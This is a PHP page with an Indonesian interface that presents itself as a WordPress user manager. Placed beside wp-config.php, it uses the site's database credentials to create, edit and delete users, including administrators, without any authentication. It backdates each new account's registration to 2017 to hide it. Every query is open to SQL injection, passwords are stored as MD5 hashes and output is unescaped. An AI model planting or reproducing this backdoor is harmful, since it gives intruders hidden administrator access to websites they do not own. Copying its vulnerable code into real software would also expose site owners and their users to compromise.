<?php
// Memuat konfigurasi WordPress
$config_file = __DIR__ . '/wp-config.php';
if (!file_exists($config_file)) {
    die("File wp-config.php tidak ditemukan.");
}

require_once($config_file);

// Mendefinisikan koneksi ke database
$host = DB_HOST;
$db = DB_NAME;
$user = DB_USER;
$pass = DB_PASSWORD;

// Prefix tabel
$table_prefix = $table_prefix ?? 'wp_';

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

$message = "";

if (isset($_POST['add_user'])) {
    $new_username = $_POST['username'];
    $new_password = $_POST['password'];
    $new_email = $_POST['email'];
    $new_password_hash = md5($new_password);
    $manipulated_date = '2017-11-05 00:00:00';
    $role = $_POST['role'];

    // Check if user already exists
    $sql = "SELECT ID FROM {$table_prefix}users WHERE user_login = '$new_username'";
    $result = $conn->query($sql);

    if ($result->num_rows == 0) {
        // Add new user
        $sql = "INSERT INTO {$table_prefix}users (user_login, user_pass, user_nicename, user_email, user_status, user_registered)
                VALUES ('$new_username', '$new_password_hash', '$new_username', '$new_email', 0, '$manipulated_date')";
        
        if ($conn->query($sql) === TRUE) {
            $user_id = $conn->insert_id;

            // Add user role
            $capabilities = ($role === 'admin') ? 'a:1:{s:13:"administrator";b:1;}' : 'a:1:{s:10:"subscriber";b:1;}';
            $user_level = ($role === 'admin') ? '10' : '0';

            $sql = "INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) 
                    VALUES ($user_id, '{$table_prefix}capabilities', '$capabilities')";
            $conn->query($sql);

            $sql = "INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) 
                    VALUES ($user_id, '{$table_prefix}user_level', '$user_level')";
            $conn->query($sql);

            $message = "Pengguna baru dengan peran $role telah ditambahkan.";
        } else {
            $message = "Error: " . $conn->error;
        }
    } else {
        $message = "Pengguna dengan username '$new_username' sudah ada.";
    }
}

if (isset($_POST['update_user'])) {
    $user_id = $_POST['user_id'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $email = $_POST['email'];
    $password_hash = md5($password);

    $sql = "UPDATE {$table_prefix}users SET user_login = '$username', user_pass = '$password_hash', user_email = '$email' WHERE ID = $user_id";
    if ($conn->query($sql) === TRUE) {
        $message = "Pengguna dengan ID $user_id telah diperbarui.";
    } else {
        $message = "Error: " . $conn->error;
    }
}

if (isset($_POST['delete_user'])) {
    $user_id = $_POST['user_id'];

    $sql = "DELETE FROM {$table_prefix}users WHERE ID = $user_id";
    if ($conn->query($sql) === TRUE) {
        $message = "Pengguna dengan ID $user_id telah dihapus.";
    } else {
        $message = "Error: " . $conn->error;
    }
}

$users = $conn->query("SELECT u.ID, u.user_login, u.user_email, um.meta_value as role 
                        FROM {$table_prefix}users u
                        LEFT JOIN {$table_prefix}usermeta um 
                        ON u.ID = um.user_id 
                        AND um.meta_key = '{$table_prefix}capabilities'");
$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manajemen Pengguna WordPress</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #0d1117;
            color: #c9d1d9;
        }
        .container {
            margin-top: 50px;
        }
        .card {
            background-color: #161b22;
            border: 1px solid #30363d;
        }
        .card-header {
            background-color: #21262d;
            border-bottom: 1px solid #30363d;
        }
        .card-footer {
            background-color: #21262d;
            border-top: 1px solid #30363d;
            text-align: center;
        }
        .btn-custom {
            background-color: #21262d;
            border: 1px solid #30363d;
            color: #c9d1d9;
        }
        .form-control {
            background-color: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
        }
        table {
            width: 100%;
            margin-top: 20px;
        }
        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #30363d;
        }
        th {
            background-color: #21262d;
        }
        .modal-content {
            background-color: #161b22;
            border: 1px solid #30363d;
        }
        .modal-header, .modal-footer {
            background-color: #21262d;
            border-bottom: 1px solid #30363d;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <h3>Manajemen Pengguna WordPress</h3>
                <button class="btn btn-custom" id="showAddUserForm">Tambah Pengguna</button>
            </div>
            <div class="card-body" id="addUserForm" style="display: none;">
                <form method="post">
                    <div class="form-group">
                        <label for="username">Username:</label>
                        <input type="text" name="username" id="username" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password:</label>
                        <input type="password" name="password" id="password" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label for="email">Email:</label>
                        <input type="email" name="email" id="email" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label for="role">Role:</label>
                        <select name="role" id="role" class="form-control" required>
                            <option value="admin">Admin</option>
                            <option value="subscriber">User Biasa</option>
                        </select>
                    </div>
                    <button type="submit" name="add_user" class="btn btn-custom">Tambah Pengguna</button>
                </form>
                <?php if ($message) { echo "<p>$message</p>"; } ?>
            </div>
            <div class="card-footer">
                &copy; Ayane Chan Arc
            </div>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <h3>Daftar Pengguna</h3>
            </div>
            <div class="card-body">
                <h4>Admin</h4>
                <table class="table table-dark table-striped">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Username</th>
                            <th>Email</th>
                            <th>Aksi</th>
                        </tr>
                    </thead>
                    <tbody id="adminTable">
                        <?php while($user = $users->fetch_assoc()): ?>
                            <?php $role = unserialize($user['role']); ?>
                            <?php if (isset($role['administrator'])): ?>
                                <tr>
                                    <td><?php echo $user['ID']; ?></td>
                                    <td><?php echo $user['user_login']; ?></td>
                                    <td><?php echo $user['user_email']; ?></td>
                                    <td>
                                        <button class="btn btn-sm btn-primary" data-toggle="modal" data-target="#editUserModal" data-id="<?php echo $user['ID']; ?>" data-username="<?php echo $user['user_login']; ?>" data-email="<?php echo $user['user_email']; ?>">Edit</button>
                                        <button class="btn btn-sm btn-danger" data-toggle="modal" data-target="#deleteUserModal" data-id="<?php echo $user['ID']; ?>">Hapus</button>
                                    </td>
                                </tr>
                            <?php endif; ?>
                        <?php endwhile; ?>
                    </tbody>
                </table>

                <h4>User Biasa</h4>
                <table class="table table-dark table-striped">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Username</th>
                            <th>Email</th>
                            <th>Aksi</th>
                        </tr>
                    </thead>
                    <tbody id="userTable">
                        <?php
                        $users->data_seek(0); // Reset result pointer to the start
                        while($user = $users->fetch_assoc()): ?>
                            <?php $role = unserialize($user['role']); ?>
                            <?php if (!isset($role['administrator'])): ?>
                                <tr>
                                    <td><?php echo $user['ID']; ?></td>
                                    <td><?php echo $user['user_login']; ?></td>
                                    <td><?php echo $user['user_email']; ?></td>
                                    <td>
                                        <button class="btn btn-sm btn-primary" data-toggle="modal" data-target="#editUserModal" data-id="<?php echo $user['ID']; ?>" data-username="<?php echo $user['user_login']; ?>" data-email="<?php echo $user['user_email']; ?>">Edit</button>
                                        <button class="btn btn-sm btn-danger" data-toggle="modal" data-target="#deleteUserModal" data-id="<?php echo $user['ID']; ?>">Hapus</button>
                                    </td>
                                </tr>
                            <?php endif; ?>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            </div>
            <div class="card-footer">
                &copy; Ayane Chan Arc
            </div>
        </div>
    </div>

    <!-- Modal for editing user -->
    <div class="modal fade" id="editUserModal" tabindex="-1" role="dialog" aria-labelledby="editUserModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="editUserModalLabel">Edit Pengguna</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="user_id" id="edit_user_id">
                        <div class="form-group">
                            <label for="edit_username">Username:</label>
                            <input type="text" name="username" id="edit_username" class="form-control" required>
                        </div>
                        <div class="form-group">
                            <label for="edit_password">Password:</label>
                            <input type="password" name="password" id="edit_password" class="form-control" required>
                        </div>
                        <div class="form-group">
                            <label for="edit_email">Email:</label>
                            <input type="email" name="email" id="edit_email" class="form-control" required>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                        <button type="submit" name="update_user" class="btn btn-primary">Update</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Modal for deleting user -->
    <div class="modal fade" id="deleteUserModal" tabindex="-1" role="dialog" aria-labelledby="deleteUserModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="deleteUserModalLabel">Hapus Pengguna</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="user_id" id="delete_user_id">
                        <p>Apakah Anda yakin ingin menghapus pengguna ini?</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                        <button type="submit" name="delete_user" class="btn btn-danger">Hapus</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        $('#showAddUserForm').click(function() {
            $('#addUserForm').toggle();
        });

        $('#editUserModal').on('show.bs.modal', function (event) {
            var button = $(event.relatedTarget);
            var userId = button.data('id');
            var username = button.data('username');
            var email = button.data('email');

            var modal = $(this);
            modal.find('#edit_user_id').val(userId);
            modal.find('#edit_username').val(username);
            modal.find('#edit_email').val(email);
        });

        $('#deleteUserModal').on('show.bs.modal', function (event) {
            var button = $(event.relatedTarget);
            var userId = button.data('id');

            var modal = $(this);
            modal.find('#delete_user_id').val(userId);
        });
    </script>
</body>
</html>
